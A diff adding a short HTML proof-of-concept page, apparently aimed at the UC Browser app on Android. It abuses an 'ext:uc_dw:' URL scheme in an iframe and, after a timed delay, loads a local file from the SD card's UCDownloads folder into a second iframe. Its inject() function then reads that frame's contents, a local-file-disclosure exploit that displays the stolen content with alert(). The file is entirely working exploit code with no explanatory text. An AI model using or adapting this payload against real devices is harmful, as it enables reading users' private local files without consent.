@@ -1,0 +1,12 @@
+<html>
+<body>
+<iframe src=ext:uc_dw:http://m.baidu.com/></iframe>
+</body>
+<script>
+function inject(){
+var d = document.getElementById("hi").contentDocument || document.getElementById("hi").contentWindow.document
+alert(d.body.innerHTML);
+}
+setTimeout("document.body.innerHTML='<iframe id=hi src=file:///mnt/sdcard/UCDownloads/index.html onload=inject()></iframe>'",5000);
+</script>
+</html>
